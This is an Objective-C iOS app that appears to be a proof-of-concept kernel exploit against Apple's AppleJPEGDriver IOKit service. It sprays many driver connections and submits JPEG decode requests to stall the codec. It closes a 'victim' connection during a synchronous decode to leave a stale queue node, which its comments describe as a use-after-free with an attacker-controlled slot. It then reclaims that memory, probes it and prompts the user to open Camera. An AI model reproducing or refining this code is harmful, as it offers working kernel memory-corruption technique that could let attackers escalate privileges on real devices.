#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <mach/mach.h>
#import <unistd.h>
#import <stdarg.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <time.h>

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef io_object_t io_iterator_t;

extern const mach_port_t kIOMainPortDefault;
kern_return_t IOServiceGetMatchingServices(mach_port_t mainPort, CFDictionaryRef matching, io_iterator_t *existing);
io_object_t IOIteratorNext(io_iterator_t iterator);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *connect);
kern_return_t IOServiceClose(io_connect_t connect);
kern_return_t IOObjectRelease(io_object_t object);
kern_return_t IOConnectCallStructMethod(io_connect_t connect, uint32_t selector,
    const void *inputStruct, size_t inputStructCnt,
    void *outputStruct, size_t *outputStructCnt);
CFMutableDictionaryRef IOServiceMatching(const char *name);

typedef struct __attribute__((packed)) {
    uint32_t sourceID;
    uint32_t field_04;
    uint32_t destID;
    uint32_t field_0C;
    uint32_t field_10;
    uint32_t width;
    uint32_t height;
    uint32_t field_1C;
    uint8_t  flags;
    uint8_t  pad_21[3];
    uint32_t xOffset;
    uint32_t yOffset;
    uint32_t subsampling;
    uint64_t asyncToken;
    uint64_t asyncToken2;
    uint64_t field_40;
    uint32_t codecID;
    uint32_t outWidth;
    uint32_t outHeight;
    uint32_t field_54;
} AppleJPEGDriverIOStruct;

_Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58, "struct size");

static UITextView *gLog = nil;
static UIViewController *gVC = nil;
static volatile int gStop = 0;
static NSLock *gLogLock = nil;
static UIBackgroundTaskIdentifier gBG = 0;
static volatile time_t gLastStormLog = 0;
#define MAX_RECLAIM 32
static io_connect_t gReclaim[MAX_RECLAIM];
static volatile int gReclaimCount = 0;

static NSString *docsPath(void) {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
}
static NSString *logPath(void) {
    return [docsPath() stringByAppendingPathComponent:@"jpegreclaim.log"];
}
static void appendLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[jpegreclaim] %@", s);
    static dispatch_once_t once;
    dispatch_once(&once, ^{ gLogLock = [NSLock new]; });
    [gLogLock lock];
    NSString *path = logPath();
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) {
        [fm createFileAtPath:path contents:nil attributes:nil];
    }
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) {
        @try {
            [fh seekToEndOfFile];
            [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
            [fh synchronizeFile];
        } @finally {
            [fh closeFile];
        }
    }
    [gLogLock unlock];
    if (gLog) {
        dispatch_async(dispatch_get_main_queue(), ^{
            gLog.text = [gLog.text stringByAppendingFormat:@"%@\n", s];
            NSRange r = NSMakeRange(gLog.text.length, 0);
            [gLog scrollRangeToVisible:r];
        });
    }
}

static io_service_t findJPEGService(void) {
    CFMutableDictionaryRef matching = IOServiceMatching("AppleJPEGDriver");
    if (!matching) return 0;
    io_iterator_t iter = 0;
    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault, matching, &iter);
    if (kr != KERN_SUCCESS || !iter) return 0;
    io_service_t svc = IOIteratorNext(iter);
    IOObjectRelease(iter);
    return svc;
}

static NSData *makeJPEG(uint32_t w, uint32_t h) {
    UIGraphicsBeginImageContext(CGSizeMake(w, h));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, w, h));
    [[UIColor blueColor] setFill];
    UIRectFill(CGRectMake(0, 0, w / 2, h / 2));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return UIImageJPEGRepresentation(img, 0.9);
}

static IOSurfaceRef makeSourceSurface(NSData *jpegData) {
    size_t len = jpegData.length;
    size_t allocLen = (len + 0x3FFF) & ~0x3FFFUL;
    NSDictionary *props = @{
        (id)kIOSurfaceWidth: @(allocLen),
        (id)kIOSurfaceHeight: @1,
        (id)kIOSurfaceBytesPerElement: @1,
        (id)kIOSurfacePixelFormat: @0x20202020,
    };
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!surf) return NULL;
    IOSurfaceLock(surf, 0, NULL);
    void *base = IOSurfaceGetBaseAddress(surf);
    memcpy(base, jpegData.bytes, jpegData.length);
    IOSurfaceUnlock(surf, 0, NULL);
    return surf;
}

static IOSurfaceRef makeDestSurface(uint32_t w, uint32_t h) {
    NSDictionary *props = @{
        (id)kIOSurfaceWidth: @(w),
        (id)kIOSurfaceHeight: @(h),
        (id)kIOSurfaceBytesPerElement: @4,
        (id)kIOSurfacePixelFormat: @0x42475241,
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)props);
}

static void fillInput(AppleJPEGDriverIOStruct *in, uint32_t srcID, uint32_t dstID,
                      uint32_t w, uint32_t h, uint8_t flags, uint64_t token) {
    memset(in, 0, sizeof(*in));
    in->sourceID = srcID;
    in->field_04 = w * h;
    in->destID = dstID;
    in->field_0C = w * h * 4;
    in->width = w;
    in->height = h;
    in->outWidth = w;
    in->outHeight = h;
    in->subsampling = 3;
    in->flags = flags;
    in->asyncToken = token;
}

static int submitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                       uint32_t w, uint32_t h, int count, uint64_t tokenBase,
                       uint8_t flags) {
    int submitted = 0;
    for (int j = 0; j < count && !gStop; j++) {
        AppleJPEGDriverIOStruct input;
        AppleJPEGDriverIOStruct output = {0};
        fillInput(&input, srcID, dstID, w, h, flags, tokenBase + j);
        size_t outSize = sizeof(output);
        kern_return_t kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input), &output, &outSize);
        if (kr != KERN_SUCCESS) break;
        submitted++;
    }
    return submitted;
}

static void beginBackgroundTask(void) {
    dispatch_async(dispatch_get_main_queue(), ^{
        gBG = [[UIApplication sharedApplication] beginBackgroundTaskWithName:@"jpegreclaim" expirationHandler:^{
            appendLog(@"background task expired");
            if (gBG != 0 && gBG != UIBackgroundTaskInvalid) {
                [[UIApplication sharedApplication] endBackgroundTask:gBG];
                gBG = 0;
            }
        }];
        appendLog(@"background task id=%lu", (unsigned long)gBG);
    });
}

static void showCameraPrompt(void) {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSURL *cameraURL = [NSURL URLWithString:@"camera://"];
        [[UIApplication sharedApplication] openURL:cameraURL options:@{} completionHandler:^(BOOL ok) {
            appendLog(@"camera:// opened=%d", ok);
        }];
        UIAlertController *a = [UIAlertController alertControllerWithTitle:@"OPEN CAMERA NOW"
            message:@"Reclaim race done. Open Camera now and wait 15 seconds."
            preferredStyle:UIAlertControllerStyleAlert];
        [a addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
        if (gVC) [gVC presentViewController:a animated:YES completion:nil];
    });
}

static void reclaimAll(void) {
    appendLog(@"build=jpegclose6 pid=%d", getpid());

    io_service_t svc = findJPEGService();
    if (!svc) { appendLog(@"service not found"); return; }
    appendLog(@"service=%#x", svc);

    const uint32_t W = 2048, H = 2048;
    NSData *jpegData = makeJPEG(W, H);
    IOSurfaceRef src = makeSourceSurface(jpegData);
    IOSurfaceRef dst = makeDestSurface(W, H);
    appendLog(@"jpeg=%lu src=%p dst=%p", (unsigned long)jpegData.length, src, dst);
    if (!src || !dst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        IOObjectRelease(svc);
        return;
    }
    uint32_t srcID = IOSurfaceGetID(src);
    uint32_t dstID = IOSurfaceGetID(dst);
    appendLog(@"srcID=%u dstID=%u", srcID, dstID);

    /* Prime: leak the client state. */
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    appendLog(@"prime open kr=%#x conn=%#x", kr, conn);
    if (kr == KERN_SUCCESS && conn) {
        int n = submitAsync(conn, srcID, dstID, W, H, 5, 0x11110000, 0);
        appendLog(@"prime submitted=%d", n);
        IOServiceClose(conn);
        appendLog(@"prime closed");
    }
    usleep(300000);

    /* Stall the codec so the sync decode reaches its 10s wait. */
    const int STHREADS = 8;
    const int SITERS = 100;
    const int SREQS = 10;
    __block int32_t sConn = 0, sReq = 0, sFail = 0;
    appendLog(@"mass spray start %dx%dx%d", STHREADS, SITERS, SREQS);
    dispatch_group_t sgroup = dispatch_group_create();
    for (int t = 0; t < STHREADS; t++) {
        dispatch_group_async(sgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            for (int i = 0; i < SITERS && !gStop; i++) {
                io_connect_t mc = 0;
                kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &mc);
                if (opr != KERN_SUCCESS || !mc) {
                    __sync_fetch_and_add(&sFail, 1);
                    continue;
                }
                int n = submitAsync(mc, srcID, dstID, W, H, SREQS,
                                    0x31310000 + (t << 8) + i, 0);
                if (n < SREQS) __sync_fetch_and_add(&sFail, 1);
                IOServiceClose(mc);
                __sync_fetch_and_add(&sReq, n);
                __sync_fetch_and_add(&sConn, 1);
            }
        });
    }
    dispatch_group_wait(sgroup, dispatch_time(DISPATCH_TIME_NOW, 120 * NSEC_PER_SEC));
    appendLog(@"mass spray done conn=%d req=%d fail=%d", sConn, sReq, sFail);
    usleep(1000000);

    /* Early reclaim storm: cover the mass-spray stale slots before the
       victim close triggers a queue walk. These requests stay in flight. */
    memset(gReclaim, 0, sizeof(gReclaim));
    gReclaimCount = 0;
    const int ETHREADS = 6;
    const int EREQS = 5;
    appendLog(@"early reclaim start threads=%d reqs=%d", ETHREADS, EREQS);
    dispatch_group_t eg = dispatch_group_create();
    for (int t = 0; t < ETHREADS; t++) {
        dispatch_group_async(eg, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            io_connect_t c = 0;
            kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
            if (opr != KERN_SUCCESS || !c) {
                appendLog(@"early reclaim[%d] open kr=%#x", t, opr);
                return;
            }
            int n = submitAsync(c, srcID, dstID, W, H, EREQS,
                                0x51510000 + (t << 8), 0);
            int idx = __sync_fetch_and_add(&gReclaimCount, 1);
            if (idx < MAX_RECLAIM) gReclaim[idx] = c;
            appendLog(@"early reclaim[%d] conn=%#x submitted=%d", t, c, n);
        });
    }
    dispatch_group_wait(eg, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
    appendLog(@"early reclaim done conns=%d", gReclaimCount);
    usleep(100000);

    /* Close the userclient WHILE a sync decode is in flight. terminatePhase1
       sets isInactive() early; the timeout free then skips the dequeue and
       leaves the embedded node in the per-codec vector. */
    io_connect_t victim = 0;
    kern_return_t vor = IOServiceOpen(svc, mach_task_self(), 0, &victim);
    appendLog(@"victim open kr=%#x conn=%#x", vor, victim);
    if (vor != KERN_SUCCESS || !victim) {
        IOObjectRelease(svc);
        CFRelease(src);
        CFRelease(dst);
        return;
    }

    __block kern_return_t syncKr = 0xdead;
    __block CFTimeInterval syncDt = 0;
    dispatch_group_t vgroup = dispatch_group_create();
    dispatch_group_async(vgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        AppleJPEGDriverIOStruct input;
        AppleJPEGDriverIOStruct output = {0};
        fillInput(&input, srcID, dstID, W, H, 0, 0);
        size_t outSize = sizeof(output);
        CFTimeInterval t0 = CFAbsoluteTimeGetCurrent();
        syncKr = IOConnectCallStructMethod(victim, 1, &input, sizeof(input), &output, &outSize);
        syncDt = CFAbsoluteTimeGetCurrent() - t0;
        appendLog(@"victim sync kr=%#x dt=%.3fs", syncKr, syncDt);
    });
    usleep(100000);
    dispatch_group_async(vgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        appendLog(@"closing victim during sync");
        kern_return_t cr = IOServiceClose(victim);
        appendLog(@"victim close kr=%#x", cr);
    });
    dispatch_group_wait(vgroup, dispatch_time(DISPATCH_TIME_NOW, 20 * NSEC_PER_SEC));
    appendLog(@"close-during-sync done kr=%#x dt=%.3fs", syncKr, syncDt);

    /* Second reclaim storm AFTER the victim sync returns. It appends to the
       early storm connections; all requests stay in flight. */
    const int RTHREADS = 6;
    const int RREQS = 5;
    appendLog(@"reclaim storm start threads=%d reqs=%d", RTHREADS, RREQS);
    dispatch_group_t rg = dispatch_group_create();
    for (int t = 0; t < RTHREADS; t++) {
        dispatch_group_async(rg, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            io_connect_t c = 0;
            kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
            if (opr != KERN_SUCCESS || !c) {
                appendLog(@"reclaim[%d] open kr=%#x", t, opr);
                return;
            }
            int n = submitAsync(c, srcID, dstID, W, H, RREQS,
                                0x71710000 + (t << 8), 0);
            int idx = __sync_fetch_and_add(&gReclaimCount, 1);
            if (idx < MAX_RECLAIM) gReclaim[idx] = c;
            appendLog(@"reclaim[%d] conn=%#x submitted=%d", t, c, n);
        });
    }
    dispatch_group_wait(rg, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
    appendLog(@"reclaim storm done conns=%d", gReclaimCount);
    usleep(50000);

    /* Probe while the reclaim requests are still in flight. */
    for (int round = 0; round < 3; round++) {
        io_connect_t probe = 0;
        kern_return_t por = IOServiceOpen(svc, mach_task_self(), 0, &probe);
        if (por != KERN_SUCCESS || !probe) {
            appendLog(@"probe round=%d open kr=%#x", round, por);
            usleep(200000);
            continue;
        }
        AppleJPEGDriverIOStruct input;
        AppleJPEGDriverIOStruct output = {0};
        fillInput(&input, srcID, dstID, W, H, 0, 0);
        size_t outSize = sizeof(output);
        CFTimeInterval t0 = CFAbsoluteTimeGetCurrent();
        kern_return_t pr = IOConnectCallStructMethod(probe, 1, &input, sizeof(input), &output, &outSize);
        CFTimeInterval dt = CFAbsoluteTimeGetCurrent() - t0;
        appendLog(@"probe round=%d kr=%#x dt=%.3fs", round, pr, dt);
        IOServiceClose(probe);
        usleep(200000);
    }

    /* Free one reclaimer connection at a time and probe after each. If the
       stale node points into that connection's request, the next walk is a
       use-after-free with a slot we control. */
    for (int i = 0; i < gReclaimCount && i < MAX_RECLAIM; i++) {
        if (!gReclaim[i]) continue;
        appendLog(@"free reclaim[%d] conn=%#x", i, gReclaim[i]);
        IOServiceClose(gReclaim[i]);
        gReclaim[i] = 0;
        usleep(100000);

        io_connect_t probe = 0;
        kern_return_t por = IOServiceOpen(svc, mach_task_self(), 0, &probe);
        if (por != KERN_SUCCESS || !probe) {
            appendLog(@"probe-after-free[%d] open kr=%#x", i, por);
            continue;
        }
        AppleJPEGDriverIOStruct input;
        AppleJPEGDriverIOStruct output = {0};
        fillInput(&input, srcID, dstID, W, H, 0, 0);
        size_t outSize = sizeof(output);
        CFTimeInterval t0 = CFAbsoluteTimeGetCurrent();
        kern_return_t pr = IOConnectCallStructMethod(probe, 1, &input, sizeof(input), &output, &outSize);
        CFTimeInterval dt = CFAbsoluteTimeGetCurrent() - t0;
        appendLog(@"probe-after-free[%d] kr=%#x dt=%.3fs", i, pr, dt);
        IOServiceClose(probe);
        usleep(100000);
    }

    /* Keep the remaining reclaim connections alive while Camera is
       foregrounded. */
    beginBackgroundTask();
    showCameraPrompt();
    sleep(40);
    gStop = 1;
    for (int i = 0; i < gReclaimCount && i < MAX_RECLAIM; i++) {
        if (gReclaim[i]) {
            IOServiceClose(gReclaim[i]);
            gReclaim[i] = 0;
        }
    }
    if (gBG != 0 && gBG != UIBackgroundTaskInvalid) {
        [[UIApplication sharedApplication] endBackgroundTask:gBG];
        gBG = 0;
    }
    CFRelease(src);
    CFRelease(dst);
    IOObjectRelease(svc);
    appendLog(@"jpegclose6 done (no panic)");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *textView;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];

    self.textView = [[UITextView alloc] initWithFrame:vc.view.bounds];
    self.textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.textView.backgroundColor = [UIColor blackColor];
    self.textView.textColor = [UIColor greenColor];
    self.textView.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    self.textView.editable = NO;
    [vc.view addSubview:self.textView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    gLog = self.textView;
    gVC = vc;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        reclaimAll();
    });
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
